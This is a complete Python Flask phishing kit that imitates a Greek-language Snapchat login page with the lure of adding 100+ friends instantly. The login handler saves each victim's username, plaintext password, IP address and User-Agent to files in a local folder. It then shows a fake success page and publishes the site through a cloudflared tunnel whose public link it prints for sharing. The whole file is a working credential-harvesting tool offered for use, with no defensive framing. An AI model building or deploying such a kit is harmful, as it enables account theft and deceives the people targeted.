import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'snapchat-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Snapchat Friends")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['sc_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Snapchat - Πρόσθεσε Φίλους</title>
        <style>
            :root {
                --sc-yellow: #fffc00;
                --sc-black: #000000;
                --sc-gray: #f5f5f5;
            }
            
            body {
                background: var(--sc-black);
                color: white;
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            
            .container {
                width: 100%;
                max-width: 400px;
                padding: 20px;
                text-align: center;
            }
            
            .ghost-icon {
                width: 80px;
                height: 80px;
                margin: 0 auto 20px;
                background: var(--sc-yellow);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 40px;
            }
            
            .sc-logo {
                font-size: 36px;
                font-weight: bold;
                color: white;
                margin-bottom: 10px;
            }
            
            .promo-banner {
                background: var(--sc-yellow);
                color: black;
                padding: 12px;
                border-radius: 20px;
                margin: 20px 0;
                font-weight: bold;
            }
            
            .friend-count {
                font-size: 24px;
                font-weight: bold;
                margin: 15px 0;
                color: var(--sc-yellow);
            }
            
            .login-box {
                background: rgba(255, 255, 255, 0.1);
                border-radius: 15px;
                padding: 30px;
                margin: 20px 0;
            }
            
            input {
                width: 100%;
                padding: 15px;
                margin: 10px 0;
                border: none;
                border-radius: 10px;
                background: rgba(255, 255, 255, 0.9);
                font-size: 16px;
                box-sizing: border-box;
            }
            
            input:focus {
                outline: 2px solid var(--sc-yellow);
            }
            
            .login-btn {
                background: var(--sc-yellow);
                color: black;
                border: none;
                padding: 15px;
                border-radius: 10px;
                font-size: 16px;
                font-weight: bold;
                width: 100%;
                margin: 15px 0;
                cursor: pointer;
            }
            
            .login-btn:hover {
                background: #e6e600;
            }
            
            .signup-btn {
                background: transparent;
                color: var(--sc-yellow);
                border: 2px solid var(--sc-yellow);
                padding: 15px;
                border-radius: 10px;
                font-size: 16px;
                font-weight: bold;
                width: 100%;
                margin: 10px 0;
                cursor: pointer;
                text-decoration: none;
                display: block;
            }
            
            .signup-btn:hover {
                background: var(--sc-yellow);
                color: black;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="ghost-icon">👻</div>
            <div class="sc-logo">Snapchat</div>
            
            <div class="promo-banner">
                🎯 ΠΡΟΣΘΕΣΕ 100+ ΦΙΛΟΥΣ ΑΜΕΣΩΣ!
            </div>
            
            <div class="friend-count">Σύνδεση & Ανάπτυξη Δικτύου</div>
            
            <div class="login-box">
                <form action="/login" method="post">
                    <input type="text" name="username" placeholder="Όνομα χρήστη ή Email" required>
                    <input type="password" name="password" placeholder="Κωδικός πρόσβασης" required>
                    <button type="submit" class="login-btn">Σύνδεση & Πρόσθεσε Φίλους</button>
                </form>
                
                <a href="#" class="signup-btn">Εγγραφή</a>
            </div>
            
            <div style="color: #888; font-size: 14px; margin-top: 20px;">
                Συνεχίζοντας, συμφωνείς με τους Όρους και την Πολιτική Απορρήτου.
            </div>
        </div>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('sc_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Πρόσθεση Φίλων - Snapchat</title>
        <style>
            body {
                background: #000000;
                color: white;
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .container {
                text-align: center;
                background: rgba(255, 255, 255, 0.1);
                padding: 40px;
                border-radius: 15px;
                max-width: 400px;
            }
            .ghost {
                font-size: 64px;
                margin: 20px 0;
                animation: float 2s infinite;
            }
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-10px); }
            }
            .processing {
                width: 100%;
                height: 4px;
                background: rgba(255, 255, 255, 0.2);
                border-radius: 2px;
                margin: 20px 0;
                overflow: hidden;
            }
            .processing-bar {
                height: 100%;
                background: #fffc00;
                animation: processing 3s infinite;
            }
            @keyframes processing {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            .success-message {
                background: rgba(255, 252, 0, 0.2);
                border: 1px solid #fffc00;
                border-radius: 8px;
                padding: 15px;
                margin: 20px 0;
            }
        </style>
        <meta http-equiv="refresh" content="5;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="ghost">👻</div>
            <h2>Πρόσθεση Φίλων!</h2>
            <div class="processing">
                <div class="processing-bar"></div>
            </div>
            <div class="success-message">
                <strong>Αίτημα φιλίας στάλθηκε σε 100+ χρήστες!</strong><br>
                Το δίκτυό σου μεγαλώνει γρήγορα!
            </div>
            <p>Ανακατεύθυνση στο Snapchat...</p>
        </div>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"Snap Friends Δημόσιος Σύνδεσμος: {tunnel_url}")
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5000")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        sys.exit(0)